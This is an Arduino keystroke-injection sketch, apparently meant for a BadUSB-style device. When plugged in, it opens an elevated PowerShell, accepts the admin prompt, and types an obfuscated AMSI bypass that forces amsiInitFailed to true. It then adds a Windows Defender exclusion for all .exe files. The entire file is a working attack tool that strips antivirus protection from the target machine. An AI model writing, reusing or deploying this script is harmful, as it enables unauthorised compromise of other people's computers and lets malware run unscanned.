#include "Keyboard.h"

void setup() {
  Keyboard.begin();
  
  delay(500);

  // Press Ctrl + R
  Keyboard.press(KEY_LEFT_GUI);  
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(200);

  // Run powershell
  Keyboard.print("powershell");

  delay(200);

  // Press Ctrl + Shift + Enter
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(300);

  // Press Left Arrow
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  // Press Enter
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(300);

  // AMSI Bypass
  // 1st Command
  Keyboard.print("$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'");
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(10);

  // 2nd Command
  Keyboard.print("$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))");
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(10);

  // 3rd Command
  Keyboard.print("$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')");
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(10);

  // 4th Command
  Keyboard.print("$field.SetValue($null,$true)");
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();

  // Add Windows Defender exclusions
  Keyboard.print("Add-MpPreference -ExclusionExtension \"exe\"");
  delay(50);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(10);

  // Exit
  Keyboard.print("exit");
  delay(50);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  
}
